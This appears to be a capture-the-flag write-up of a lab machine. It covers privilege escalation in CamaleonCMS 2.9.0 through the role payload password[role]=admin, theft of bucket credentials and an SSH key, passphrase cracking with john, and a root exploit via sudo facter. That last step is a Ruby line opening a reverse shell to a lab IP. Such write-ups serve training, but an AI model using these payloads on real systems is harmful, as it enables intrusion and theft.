cat web-exploit

Once the web portal is accessed, we are presented with a web application like the following:

Analyzing the various pages of the site, I discover that some of them contain comments:

I therefore assume that a login page exists somewhere, and indeed it doesn't take long to retrieve the path to an admin login form:

As can be seen in the screenshot above, it is possible to register a user on the application. I proceed to create the user kodiak:kodiak and log in.

Once a session is established, I discover two key aspects:

  1. The user is created with a client role, thus defining a priority among the site's different roles.
  2. The website is built using a CMS called CamaleonCMS (version 2.9.0), which is written in Ruby.

Through various Google searches, I find that this version of Camaleon is vulnerable to an authorization bypass that allows privilege escalation within the site. This issue is tracked under CVE-2025-2304. I use BurpSuite to craft a password change request that also includes the modification of the user[role]=admin attribute. The explanation of the CVE is not very clear, and I needed a few requests (and a second account called kodiak2) to actually understand the exploit. The password attribute is treated as the user object, and the password and password_confirm fields are used to validate the password change. However, since it is treated as user, we can inject the role field directly into this object, obtaining the payload password[role]=admin.

At the end of the flow, it is necessary to refresh the page with CTRL+F5 to actually see the changes, but we will have become Administrator.

As we can see in the screenshot, becoming site administrators gives us access to a whole range of settings. I therefore resume the enumeration phase on the newly available resources.

cat foothold

Inside the Settings > General Site menu, among others, there is a Filesystem Settings submenu. In this menu entry I find an access key and a secret key for what appears to be a self-hosted AWS bucket. Local AWS buckets are common for development purposes. I therefore attempt to access the bucket with the recovered credentials using awscli.

We are now able to access the exposed buckets through port 54321 (the port was also recovered from the same configuration). However, since it is a local bucket, we need to specify the resource using the --endpoint-url flag:

Noticing the presence of a bucket called internal, I begin enumerating this repository until I come across a .ssh folder containing the files authorized_keys and id_ed25519. I download both and notice that the key in the id_ed25519 file is indeed the one authorized for access. Two things are now needed:

  1. The username of the user for whom the key was generated.
  2. The encryption password of the key itself.

The username is quickly obtained -- thanks to ChatGPT I get the command to extract it:

ssh-keygen -y -f id_ed25519

The only issue is that this command asks for the password. To get the password, we need the combination of two tools: ssh2john and john.

cat privilege-escalation

The privilege escalation part is straightforward. Running sudo -l reveals that I have permission to execute, as root and without a password, the facter tool, for which there is a known privilege escalation vector on GTFOBins at the following resource

I follow the guide step by step:

  1. I create a /tmp/kodiak folder in which I place the root.rb file containing the following Ruby code: spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.15.167",1234)).
  2. I run the facter command with sudo /usr/bin/facter --custom-dir=. from inside the /tmp/kodiak folder.

Facter will retrieve the first Ruby file present in the custom-dir and execute it. Running this file will give us a reverse shell as root.
